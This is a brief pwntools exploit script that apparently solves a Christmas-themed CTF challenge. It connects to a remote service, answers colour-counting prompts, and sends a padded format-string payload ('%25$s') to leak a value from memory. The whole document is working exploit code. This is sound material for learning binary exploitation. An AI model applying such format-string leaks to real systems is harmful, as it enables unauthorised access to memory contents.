from pwn import *

context.log_level='warn'
context.arch = 'amd64'

def main():
    #r = process('./vuln')
    r = remote('152.96.15.2',1337)
    # Yes
    r.sendlineafter(b"?", b"y")

    # Pass count check
    a = r.recvuntil(b'Santa: How many')
    r.sendlineafter(b">", str(a.count(b"red")).encode('utf-8'))
    r.sendlineafter(b">", str(a.count(b"yellow")).encode('utf-8'))
    r.sendlineafter(b">", str(a.count(b"blue")).encode('utf-8'))

    # Setup canary
    r.sendlineafter(b"name?", b"bread")

    # Finding username in mem
    pad = "A"*131
    payload = f"%25$s{pad}".encode('utf-8')+p8(135)
    r.sendlineafter(b"else?", payload)
    r.recvuntil(b"with ")
    a = r.recvuntil(b"Santa")
    print(f"{a[:-5]}")
    r.recvall()

main()